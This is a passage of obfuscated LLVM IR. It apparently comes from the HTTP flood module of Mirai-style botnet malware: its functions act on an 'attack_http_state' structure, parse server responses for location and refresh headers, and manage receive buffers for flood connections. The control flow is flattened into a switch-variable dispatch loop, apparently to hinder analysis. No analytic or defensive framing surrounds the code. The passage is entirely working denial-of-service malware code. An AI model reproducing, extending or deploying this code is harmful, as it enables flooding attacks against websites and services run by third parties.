  %1753 = sub nsw i32 %1751, %1752
  %1754 = call i32 @util_memsearch(i8* %1750, i32 %1753, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1754, i32* %56, align 4
  %1755 = load i32, i32* %56, align 4
  %1756 = icmp ne i32 %1755, -1
  %1757 = select i1 %1756, i32 300174417, i32 -709784769
  store i32 %1757, i32* %switchVar
  br label %loopEnd

; <label>:1758:                                   ; preds = %loopEntry
  %1759 = load i32, i32* %55, align 4
  %1760 = sext i32 %1759 to i64
  %1761 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1760
  store i8* %1761, i8** %57, align 8
  %1762 = load i32, i32* %56, align 4
  %1763 = icmp sge i32 %1762, 2
  %1764 = select i1 %1763, i32 -1612589025, i32 2092427477
  store i32 %1764, i32* %switchVar
  br label %loopEnd

; <label>:1765:                                   ; preds = %loopEntry
  %1766 = load i32, i32* %56, align 4
  %1767 = sub nsw i32 %1766, 2
  store i32 %1767, i32* %56, align 4
  store i32 2092427477, i32* %switchVar
  br label %loopEnd

; <label>:1768:                                   ; preds = %loopEntry
  %1769 = load i32, i32* %55, align 4
  %1770 = load i32, i32* %56, align 4
  %1771 = add nsw i32 %1769, %1770
  %1772 = sext i32 %1771 to i64
  %1773 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1772
  store i8 0, i8* %1773, align 1
  %1774 = load i32, i32* %56, align 4
  %1775 = add nsw i32 %1774, 1
  store i32 %1775, i32* %56, align 4
  store i32 0, i32* %10, align 4
  store i32 615782483, i32* %switchVar
  br label %loopEnd

; <label>:1776:                                   ; preds = %loopEntry
  %1777 = load i8*, i8** %57, align 8
  %1778 = load i32, i32* %10, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds i8, i8* %1777, i64 %1779
  %1781 = load i8, i8* %1780, align 1
  %1782 = sext i8 %1781 to i32
  %1783 = icmp ne i32 %1782, 0
  %1784 = select i1 %1783, i32 2024690172, i32 794007438
  store i32 %1784, i32* %switchVar
  store i1 false, i1* %.reg2mem19
  br label %loopEnd

; <label>:1785:                                   ; preds = %loopEntry
  %1786 = load i8*, i8** %57, align 8
  %1787 = load i32, i32* %10, align 4
  %1788 = sext i32 %1787 to i64
  %1789 = getelementptr inbounds i8, i8* %1786, i64 %1788
  %1790 = load i8, i8* %1789, align 1
  %1791 = sext i8 %1790 to i32
  %1792 = icmp sge i32 %1791, 48
  %1793 = select i1 %1792, i32 2031909386, i32 794007438
  store i32 %1793, i32* %switchVar
  store i1 false, i1* %.reg2mem19
  br label %loopEnd

; <label>:1794:                                   ; preds = %loopEntry
  %1795 = load i8*, i8** %57, align 8
  %1796 = load i32, i32* %10, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds i8, i8* %1795, i64 %1797
  %1799 = load i8, i8* %1798, align 1
  %1800 = sext i8 %1799 to i32
  %1801 = icmp sle i32 %1800, 57
  store i32 794007438, i32* %switchVar
  store i1 %1801, i1* %.reg2mem19
  br label %loopEnd

; <label>:1802:                                   ; preds = %loopEntry
  %.reload20 = load i1, i1* %.reg2mem19
  %1803 = select i1 %.reload20, i32 -1297771190, i32 -1995493266
  store i32 %1803, i32* %switchVar
  br label %loopEnd

; <label>:1804:                                   ; preds = %loopEntry
  %1805 = load i32, i32* %10, align 4
  %1806 = add nsw i32 %1805, 1
  store i32 %1806, i32* %10, align 4
  store i32 615782483, i32* %switchVar
  br label %loopEnd

; <label>:1807:                                   ; preds = %loopEntry
  %1808 = load i8*, i8** %57, align 8
  %1809 = load i32, i32* %10, align 4
  %1810 = sext i32 %1809 to i64
  %1811 = getelementptr inbounds i8, i8* %1808, i64 %1810
  %1812 = load i8, i8* %1811, align 1
  %1813 = sext i8 %1812 to i32
  %1814 = icmp ne i32 %1813, 0
  %1815 = select i1 %1814, i32 1137014252, i32 -751736116
  store i32 %1815, i32* %switchVar
  br label %loopEnd

; <label>:1816:                                   ; preds = %loopEntry
  store i32 0, i32* %58, align 4
  %1817 = load i8*, i8** %57, align 8
  %1818 = load i32, i32* %10, align 4
  %1819 = sext i32 %1818 to i64
  %1820 = getelementptr inbounds i8, i8* %1817, i64 %1819
  store i8 0, i8* %1820, align 1
  %1821 = load i32, i32* %10, align 4
  %1822 = add nsw i32 %1821, 1
  store i32 %1822, i32* %10, align 4
  %1823 = load i8*, i8** %57, align 8
  %1824 = load i32, i32* %10, align 4
  %1825 = sext i32 %1824 to i64
  %1826 = getelementptr inbounds i8, i8* %1823, i64 %1825
  %1827 = load i8, i8* %1826, align 1
  %1828 = sext i8 %1827 to i32
  %1829 = icmp eq i32 %1828, 32
  %1830 = select i1 %1829, i32 -641134741, i32 1430029824
  store i32 %1830, i32* %switchVar
  br label %loopEnd

; <label>:1831:                                   ; preds = %loopEntry
  %1832 = load i32, i32* %10, align 4
  %1833 = add nsw i32 %1832, 1
  store i32 %1833, i32* %10, align 4
  store i32 1430029824, i32* %switchVar
  br label %loopEnd

; <label>:1834:                                   ; preds = %loopEntry
  %1835 = load i8*, i8** %57, align 8
  %1836 = load i32, i32* %10, align 4
  %1837 = sext i32 %1836 to i64
  %1838 = getelementptr inbounds i8, i8* %1835, i64 %1837
  %1839 = load i8*, i8** %57, align 8
  %1840 = load i32, i32* %10, align 4
  %1841 = sext i32 %1840 to i64
  %1842 = getelementptr inbounds i8, i8* %1839, i64 %1841
  %1843 = call i32 @util_strlen(i8* %1842)
  %1844 = call i32 @util_stristr(i8* %1838, i32 %1843, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1845 = icmp ne i32 %1844, -1
  %1846 = select i1 %1845, i32 -145368711, i32 1393537091
  store i32 %1846, i32* %switchVar
  br label %loopEnd

; <label>:1847:                                   ; preds = %loopEntry
  %1848 = load i8*, i8** %57, align 8
  %1849 = load i32, i32* %10, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds i8, i8* %1848, i64 %1850
  %1852 = load i8*, i8** %57, align 8
  %1853 = load i32, i32* %10, align 4
  %1854 = sext i32 %1853 to i64
  %1855 = getelementptr inbounds i8, i8* %1852, i64 %1854
  %1856 = call i32 @util_strlen(i8* %1855)
  %1857 = call i32 @util_stristr(i8* %1851, i32 %1856, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1858 = load i32, i32* %10, align 4
  %1859 = add nsw i32 %1858, %1857
  store i32 %1859, i32* %10, align 4
  store i32 1393537091, i32* %switchVar
  br label %loopEnd

; <label>:1860:                                   ; preds = %loopEntry
  %1861 = load i8*, i8** %57, align 8
  %1862 = load i32, i32* %10, align 4
  %1863 = sext i32 %1862 to i64
  %1864 = getelementptr inbounds i8, i8* %1861, i64 %1863
  %1865 = load i8, i8* %1864, align 1
  %1866 = sext i8 %1865 to i32
  %1867 = icmp eq i32 %1866, 34
  %1868 = select i1 %1867, i32 -979701941, i32 -187235951
  store i32 %1868, i32* %switchVar
  br label %loopEnd

; <label>:1869:                                   ; preds = %loopEntry
  %1870 = load i32, i32* %10, align 4
  %1871 = add nsw i32 %1870, 1
  store i32 %1871, i32* %10, align 4
  %1872 = load i8*, i8** %57, align 8
  %1873 = load i32, i32* %10, align 4
  %1874 = sext i32 %1873 to i64
  %1875 = getelementptr inbounds i8, i8* %1872, i64 %1874
  %1876 = load i8*, i8** %57, align 8
  %1877 = load i32, i32* %10, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds i8, i8* %1876, i64 %1878
  %1880 = call i32 @util_strlen(i8* %1879)
  %1881 = sub nsw i32 %1880, 1
  %1882 = sext i32 %1881 to i64
  %1883 = getelementptr inbounds i8, i8* %1875, i64 %1882
  %1884 = load i8, i8* %1883, align 1
  %1885 = sext i8 %1884 to i32
  %1886 = icmp eq i32 %1885, 34
  %1887 = select i1 %1886, i32 740392331, i32 -1682125817
  store i32 %1887, i32* %switchVar
  br label %loopEnd

; <label>:1888:                                   ; preds = %loopEntry
  %1889 = load i8*, i8** %57, align 8
  %1890 = load i32, i32* %10, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds i8, i8* %1889, i64 %1891
  %1893 = load i8*, i8** %57, align 8
  %1894 = load i32, i32* %10, align 4
  %1895 = sext i32 %1894 to i64
  %1896 = getelementptr inbounds i8, i8* %1893, i64 %1895
  %1897 = call i32 @util_strlen(i8* %1896)
  %1898 = sub nsw i32 %1897, 1
  %1899 = sext i32 %1898 to i64
  %1900 = getelementptr inbounds i8, i8* %1892, i64 %1899
  store i8 0, i8* %1900, align 1
  store i32 -1682125817, i32* %switchVar
  br label %loopEnd

; <label>:1901:                                   ; preds = %loopEntry
  store i32 -187235951, i32* %switchVar
  br label %loopEnd

; <label>:1902:                                   ; preds = %loopEntry
  %1903 = load i8*, i8** %57, align 8
  %1904 = call i32 @util_atoi(i8* %1903, i32 10)
  store i32 %1904, i32* %58, align 4
  store i32 -751407083, i32* %switchVar
  br label %loopEnd

; <label>:1905:                                   ; preds = %loopEntry
  %1906 = load i32, i32* %58, align 4
  %1907 = icmp sgt i32 %1906, 0
  %1908 = select i1 %1907, i32 -1775480146, i32 -657360589
  store i32 %1908, i32* %switchVar
  store i1 false, i1* %.reg2mem21
  br label %loopEnd

; <label>:1909:                                   ; preds = %loopEntry
  %1910 = load i32, i32* %58, align 4
  %1911 = icmp slt i32 %1910, 10
  %1912 = select i1 %1911, i32 -584406361, i32 -657360589
  store i32 %1912, i32* %switchVar
  store i1 false, i1* %.reg2mem21
  br label %loopEnd

; <label>:1913:                                   ; preds = %loopEntry
  %1914 = load i32, i32* %27, align 4
  %1915 = load i32, i32* %58, align 4
  %1916 = add i32 %1914, %1915
  %1917 = zext i32 %1916 to i64
  %1918 = call i64 @time(i64* null) #6
  %1919 = icmp sgt i64 %1917, %1918
  store i32 -657360589, i32* %switchVar
  store i1 %1919, i1* %.reg2mem21
  br label %loopEnd

; <label>:1920:                                   ; preds = %loopEntry
  %.reload22 = load i1, i1* %.reg2mem21
  %1921 = select i1 %.reload22, i32 2115821246, i32 242626544
  store i32 %1921, i32* %switchVar
  br label %loopEnd

; <label>:1922:                                   ; preds = %loopEntry
  %1923 = call i32 @sleep(i32 1)
  store i32 -751407083, i32* %switchVar
  br label %loopEnd

; <label>:1924:                                   ; preds = %loopEntry
  %1925 = load i8*, i8** %57, align 8
  %1926 = load i32, i32* %10, align 4
  %1927 = sext i32 %1926 to i64
  %1928 = getelementptr inbounds i8, i8* %1925, i64 %1927
  store i8* %1928, i8** %57, align 8
  %1929 = load i8*, i8** %57, align 8
  %1930 = load i8*, i8** %57, align 8
  %1931 = call i32 @util_strlen(i8* %1930)
  %1932 = call i32 @util_stristr(i8* %1929, i32 %1931, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %1933 = icmp eq i32 %1932, 4
  %1934 = select i1 %1933, i32 1124022979, i32 -1826613185
  store i32 %1934, i32* %switchVar
  br label %loopEnd

; <label>:1935:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %1936 = load i8*, i8** %57, align 8
  %1937 = getelementptr inbounds i8, i8* %1936, i64 4
  %1938 = load i8, i8* %1937, align 1
  %1939 = sext i8 %1938 to i32
  %1940 = icmp eq i32 %1939, 115
  %1941 = select i1 %1940, i32 -672638093, i32 -441873711
  store i32 %1941, i32* %switchVar
  br label %loopEnd

; <label>:1942:                                   ; preds = %loopEntry
  %1943 = load i32, i32* %10, align 4
  %1944 = add nsw i32 %1943, 1
  store i32 %1944, i32* %10, align 4
  store i32 -441873711, i32* %switchVar
  br label %loopEnd

; <label>:1945:                                   ; preds = %loopEntry
  %1946 = load i8*, i8** %57, align 8
  %1947 = load i8*, i8** %57, align 8
  %1948 = load i32, i32* %10, align 4
  %1949 = sext i32 %1948 to i64
  %1950 = getelementptr inbounds i8, i8* %1947, i64 %1949
  %1951 = load i32, i32* %56, align 4
  %1952 = load i32, i32* %10, align 4
  %1953 = sub nsw i32 %1951, %1952
  %1954 = sext i32 %1953 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1946, i8* %1950, i64 %1954, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 532386433, i32* %switchVar
  br label %loopEnd

; <label>:1955:                                   ; preds = %loopEntry
  %1956 = load i8*, i8** %57, align 8
  %1957 = load i32, i32* %10, align 4
  %1958 = sext i32 %1957 to i64
  %1959 = getelementptr inbounds i8, i8* %1956, i64 %1958
  %1960 = load i8, i8* %1959, align 1
  %1961 = sext i8 %1960 to i32
  %1962 = icmp ne i32 %1961, 0
  %1963 = select i1 %1962, i32 -911127405, i32 444274115
  store i32 %1963, i32* %switchVar
  br label %loopEnd

; <label>:1964:                                   ; preds = %loopEntry
  %1965 = load i8*, i8** %57, align 8
  %1966 = load i32, i32* %10, align 4
  %1967 = sext i32 %1966 to i64
  %1968 = getelementptr inbounds i8, i8* %1965, i64 %1967
  %1969 = load i8, i8* %1968, align 1
  %1970 = sext i8 %1969 to i32
  %1971 = icmp eq i32 %1970, 47
  %1972 = select i1 %1971, i32 -1413602084, i32 -1176555668
  store i32 %1972, i32* %switchVar
  br label %loopEnd

; <label>:1973:                                   ; preds = %loopEntry
  %1974 = load i8*, i8** %57, align 8
  %1975 = load i32, i32* %10, align 4
  %1976 = sext i32 %1975 to i64
  %1977 = getelementptr inbounds i8, i8* %1974, i64 %1976
  store i8 0, i8* %1977, align 1
  store i32 444274115, i32* %switchVar
  br label %loopEnd

; <label>:1978:                                   ; preds = %loopEntry
  %1979 = load i32, i32* %10, align 4
  %1980 = add nsw i32 %1979, 1
  store i32 %1980, i32* %10, align 4
  store i32 532386433, i32* %switchVar
  br label %loopEnd

; <label>:1981:                                   ; preds = %loopEntry
  %1982 = load i8*, i8** %57, align 8
  %1983 = call i32 @util_strlen(i8* %1982)
  %1984 = icmp sgt i32 %1983, 0
  %1985 = select i1 %1984, i32 -932258599, i32 -308411896
  store i32 %1985, i32* %switchVar
  br label %loopEnd

; <label>:1986:                                   ; preds = %loopEntry
  %1987 = load i8*, i8** %57, align 8
  %1988 = call i32 @util_strlen(i8* %1987)
  %1989 = icmp slt i32 %1988, 128
  %1990 = select i1 %1989, i32 -1287144592, i32 -308411896
  store i32 %1990, i32* %switchVar
  br label %loopEnd

; <label>:1991:                                   ; preds = %loopEntry
  %1992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1992, i32 0, i32 7
  %1994 = getelementptr inbounds [129 x i8], [129 x i8]* %1993, i32 0, i32 0
  %1995 = load i8*, i8** %57, align 8
  %1996 = call i32 @util_strcpy(i8* %1994, i8* %1995)
  store i32 -308411896, i32* %switchVar
  br label %loopEnd

; <label>:1997:                                   ; preds = %loopEntry
  %1998 = load i8*, i8** %57, align 8
  %1999 = load i32, i32* %10, align 4
  %2000 = add nsw i32 %1999, 1
  %2001 = sext i32 %2000 to i64
  %2002 = getelementptr inbounds i8, i8* %1998, i64 %2001
  %2003 = call i32 @util_strlen(i8* %2002)
  %2004 = icmp slt i32 %2003, 256
  %2005 = select i1 %2004, i32 -1355761829, i32 -54115935
  store i32 %2005, i32* %switchVar
  br label %loopEnd

; <label>:2006:                                   ; preds = %loopEntry
  %2007 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2007, i32 0, i32 6
  %2009 = getelementptr inbounds [257 x i8], [257 x i8]* %2008, i32 0, i32 0
  %2010 = getelementptr inbounds i8, i8* %2009, i64 1
  call void @util_zero(i8* %2010, i32 255)
  %2011 = load i8*, i8** %57, align 8
  %2012 = load i32, i32* %10, align 4
  %2013 = add nsw i32 %2012, 1
  %2014 = sext i32 %2013 to i64
  %2015 = getelementptr inbounds i8, i8* %2011, i64 %2014
  %2016 = call i32 @util_strlen(i8* %2015)
  %2017 = icmp sgt i32 %2016, 0
  %2018 = select i1 %2017, i32 150931538, i32 1074849915
  store i32 %2018, i32* %switchVar
  br label %loopEnd

; <label>:2019:                                   ; preds = %loopEntry
  %2020 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2021 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2020, i32 0, i32 6
  %2022 = getelementptr inbounds [257 x i8], [257 x i8]* %2021, i32 0, i32 0
  %2023 = getelementptr inbounds i8, i8* %2022, i64 1
  %2024 = load i8*, i8** %57, align 8
  %2025 = load i32, i32* %10, align 4
  %2026 = add nsw i32 %2025, 1
  %2027 = sext i32 %2026 to i64
  %2028 = getelementptr inbounds i8, i8* %2024, i64 %2027
  %2029 = call i32 @util_strcpy(i8* %2023, i8* %2028)
  store i32 1074849915, i32* %switchVar
  br label %loopEnd

; <label>:2030:                                   ; preds = %loopEntry
  store i32 -54115935, i32* %switchVar
  br label %loopEnd

; <label>:2031:                                   ; preds = %loopEntry
  store i32 -1376349795, i32* %switchVar
  br label %loopEnd

; <label>:2032:                                   ; preds = %loopEntry
  %2033 = load i8*, i8** %57, align 8
  %2034 = getelementptr inbounds i8, i8* %2033, i64 0
  %2035 = load i8, i8* %2034, align 1
  %2036 = sext i8 %2035 to i32
  %2037 = icmp eq i32 %2036, 47
  %2038 = select i1 %2037, i32 -832333970, i32 1308316347
  store i32 %2038, i32* %switchVar
  br label %loopEnd

; <label>:2039:                                   ; preds = %loopEntry
  %2040 = load i8*, i8** %57, align 8
  %2041 = load i32, i32* %10, align 4
  %2042 = add nsw i32 %2041, 1
  %2043 = sext i32 %2042 to i64
  %2044 = getelementptr inbounds i8, i8* %2040, i64 %2043
  %2045 = call i32 @util_strlen(i8* %2044)
  %2046 = icmp slt i32 %2045, 256
  %2047 = select i1 %2046, i32 -949926251, i32 1730447103
  store i32 %2047, i32* %switchVar
  br label %loopEnd

; <label>:2048:                                   ; preds = %loopEntry
  %2049 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2050 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2049, i32 0, i32 6
  %2051 = getelementptr inbounds [257 x i8], [257 x i8]* %2050, i32 0, i32 0
  %2052 = getelementptr inbounds i8, i8* %2051, i64 1
  call void @util_zero(i8* %2052, i32 255)
  %2053 = load i8*, i8** %57, align 8
  %2054 = load i32, i32* %10, align 4
  %2055 = add nsw i32 %2054, 1
  %2056 = sext i32 %2055 to i64
  %2057 = getelementptr inbounds i8, i8* %2053, i64 %2056
  %2058 = call i32 @util_strlen(i8* %2057)
  %2059 = icmp sgt i32 %2058, 0
  %2060 = select i1 %2059, i32 1426456844, i32 1825813390
  store i32 %2060, i32* %switchVar
  br label %loopEnd

; <label>:2061:                                   ; preds = %loopEntry
  %2062 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2063 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2062, i32 0, i32 6
  %2064 = getelementptr inbounds [257 x i8], [257 x i8]* %2063, i32 0, i32 0
  %2065 = getelementptr inbounds i8, i8* %2064, i64 1
  %2066 = load i8*, i8** %57, align 8
  %2067 = load i32, i32* %10, align 4
  %2068 = add nsw i32 %2067, 1
  %2069 = sext i32 %2068 to i64
  %2070 = getelementptr inbounds i8, i8* %2066, i64 %2069
  %2071 = call i32 @util_strcpy(i8* %2065, i8* %2070)
  store i32 1825813390, i32* %switchVar
  br label %loopEnd

; <label>:2072:                                   ; preds = %loopEntry
  store i32 1730447103, i32* %switchVar
  br label %loopEnd

; <label>:2073:                                   ; preds = %loopEntry
  store i32 1308316347, i32* %switchVar
  br label %loopEnd

; <label>:2074:                                   ; preds = %loopEntry
  store i32 -1376349795, i32* %switchVar
  br label %loopEnd

; <label>:2075:                                   ; preds = %loopEntry
  %2076 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2076, i32 0, i32 9
  %2078 = getelementptr inbounds [9 x i8], [9 x i8]* %2077, i32 0, i32 0
  %2079 = call i8* @strcpy(i8* %2078, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2080 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2081 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2080, i32 0, i32 1
  store i8 10, i8* %2081, align 4
  store i32 -218755353, i32* %switchVar
  br label %loopEnd

; <label>:2082:                                   ; preds = %loopEntry
  store i32 -709784769, i32* %switchVar
  br label %loopEnd

; <label>:2083:                                   ; preds = %loopEntry
  store i32 1522297801, i32* %switchVar
  br label %loopEnd

; <label>:2084:                                   ; preds = %loopEntry
  %2085 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2086 = load i32, i32* %12, align 4
  %2087 = call i32 @util_memsearch(i8* %2085, i32 %2086, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2087, i32* %37, align 4
  %2088 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2089 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2088, i32 0, i32 9
  %2090 = getelementptr inbounds [9 x i8], [9 x i8]* %2089, i32 0, i32 0
  %2091 = call signext i8 @util_strcmp(i8* %2090, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2092 = sext i8 %2091 to i32
  %2093 = icmp ne i32 %2092, 0
  %2094 = select i1 %2093, i32 718673740, i32 -852491659
  store i32 %2094, i32* %switchVar
  br label %loopEnd

; <label>:2095:                                   ; preds = %loopEntry
  %2096 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2097 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2096, i32 0, i32 9
  %2098 = getelementptr inbounds [9 x i8], [9 x i8]* %2097, i32 0, i32 0
  %2099 = call signext i8 @util_strcmp(i8* %2098, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2100 = sext i8 %2099 to i32
  %2101 = icmp ne i32 %2100, 0
  %2102 = select i1 %2101, i32 718673740, i32 -1771332067
  store i32 %2102, i32* %switchVar
  br label %loopEnd

; <label>:2103:                                   ; preds = %loopEntry
  %2104 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2105 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2104, i32 0, i32 1
  store i8 7, i8* %2105, align 4
  store i32 2001234707, i32* %switchVar
  br label %loopEnd

; <label>:2106:                                   ; preds = %loopEntry
  %2107 = load i32, i32* %12, align 4
  %2108 = load i32, i32* %37, align 4
  %2109 = icmp sgt i32 %2107, %2108
  %2110 = select i1 %2109, i32 -675185851, i32 95030122
  store i32 %2110, i32* %switchVar
  br label %loopEnd

; <label>:2111:                                   ; preds = %loopEntry
  %2112 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2113 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2112, i32 0, i32 1
  store i8 10, i8* %2113, align 4
  store i32 1836896413, i32* %switchVar
  br label %loopEnd

; <label>:2114:                                   ; preds = %loopEntry
  %2115 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2115, i32 0, i32 1
  store i8 1, i8* %2116, align 4
  store i32 1836896413, i32* %switchVar
  br label %loopEnd

; <label>:2117:                                   ; preds = %loopEntry
  store i32 2001234707, i32* %switchVar
  br label %loopEnd

; <label>:2118:                                   ; preds = %loopEntry
  %2119 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2120 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2119, i32 0, i32 0
  %2121 = load i32, i32* %2120, align 4
  %2122 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2123 = load i32, i32* %37, align 4
  %2124 = sext i32 %2123 to i64
  %2125 = call i64 @recv(i32 %2121, i8* %2122, i64 %2124, i32 16384)
  %2126 = trunc i64 %2125 to i32
  store i32 %2126, i32* %12, align 4
  store i32 1725086466, i32* %switchVar
  br label %loopEnd

; <label>:2127:                                   ; preds = %loopEntry
  %2128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2128, i32 0, i32 1
  %2130 = load i8, i8* %2129, align 4
  %2131 = zext i8 %2130 to i32
  %2132 = icmp eq i32 %2131, 7
  %2133 = select i1 %2132, i32 -462720326, i32 710233807
  store i32 %2133, i32* %switchVar
  br label %loopEnd

; <label>:2134:                                   ; preds = %loopEntry
  store i32 368647132, i32* %switchVar
  br label %loopEnd

; <label>:2135:                                   ; preds = %loopEntry
  %2136 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2137 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2136, i32 0, i32 1
  %2138 = load i8, i8* %2137, align 4
  %2139 = zext i8 %2138 to i32
  %2140 = icmp ne i32 %2139, 7
  %2141 = select i1 %2140, i32 939276051, i32 912473565
  store i32 %2141, i32* %switchVar
  br label %loopEnd

; <label>:2142:                                   ; preds = %loopEntry
  store i32 -726301654, i32* %switchVar
  br label %loopEnd

; <label>:2143:                                   ; preds = %loopEntry
  %2144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2144, i32 0, i32 17
  %2146 = load i32, i32* %2145, align 4
  %2147 = icmp eq i32 %2146, 1024
  %2148 = select i1 %2147, i32 1659010339, i32 1182151728
  store i32 %2148, i32* %switchVar
  br label %loopEnd

; <label>:2149:                                   ; preds = %loopEntry
  %2150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2150, i32 0, i32 18
  %2152 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2151, i32 0, i32 0
  %2153 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2154 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2153, i32 0, i32 18
  %2155 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2154, i32 0, i32 0
  %2156 = getelementptr inbounds i8, i8* %2155, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2152, i8* %2156, i64 960, i32 1, i1 false)
  %2157 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2157, i32 0, i32 17
  %2159 = load i32, i32* %2158, align 4
  %2160 = sub nsw i32 %2159, 64
  store i32 %2160, i32* %2158, align 4
  store i32 1182151728, i32* %switchVar
  br label %loopEnd

; <label>:2161:                                   ; preds = %loopEntry
  %2162 = call i32* @__errno_location() #7
  store i32 0, i32* %2162, align 4
  %2163 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2163, i32 0, i32 0
  %2165 = load i32, i32* %2164, align 4
  %2166 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2166, i32 0, i32 18
  %2168 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2167, i32 0, i32 0
  %2169 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2169, i32 0, i32 17
  %2171 = load i32, i32* %2170, align 4
  %2172 = sext i32 %2171 to i64
  %2173 = getelementptr inbounds i8, i8* %2168, i64 %2172
  %2174 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2174, i32 0, i32 17
  %2176 = load i32, i32* %2175, align 4
  %2177 = sub nsw i32 1024, %2176
  %2178 = sext i32 %2177 to i64
  %2179 = call i64 @recv(i32 %2165, i8* %2173, i64 %2178, i32 16384)
  %2180 = trunc i64 %2179 to i32
  store i32 %2180, i32* %12, align 4
  %2181 = load i32, i32* %12, align 4
  %2182 = icmp eq i32 %2181, 0
  %2183 = select i1 %2182, i32 701958788, i32 602096038
  store i32 %2183, i32* %switchVar
  br label %loopEnd

; <label>:2184:                                   ; preds = %loopEntry
  %2185 = call i32* @__errno_location() #7
  store i32 104, i32* %2185, align 4
  store i32 -1, i32* %12, align 4
  store i32 602096038, i32* %switchVar
  br label %loopEnd

; <label>:2186:                                   ; preds = %loopEntry
  %2187 = load i32, i32* %12, align 4
  %2188 = icmp eq i32 %2187, -1
  %2189 = select i1 %2188, i32 -1557909494, i32 -1647387243
  store i32 %2189, i32* %switchVar
  br label %loopEnd

; <label>:2190:                                   ; preds = %loopEntry
  %2191 = call i32* @__errno_location() #7
  %2192 = load i32, i32* %2191, align 4
  %2193 = icmp ne i32 %2192, 11
  %2194 = select i1 %2193, i32 598778811, i32 -79504362
  store i32 %2194, i32* %switchVar
  br label %loopEnd

; <label>:2195:                                   ; preds = %loopEntry
  %2196 = call i32* @__errno_location() #7
  %2197 = load i32, i32* %2196, align 4
  %2198 = icmp ne i32 %2197, 11
  %2199 = select i1 %2198, i32 201677498, i32 -79504362
  store i32 %2199, i32* %switchVar
  br label %loopEnd

; <label>:2200:                                   ; preds = %loopEntry
  %2201 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
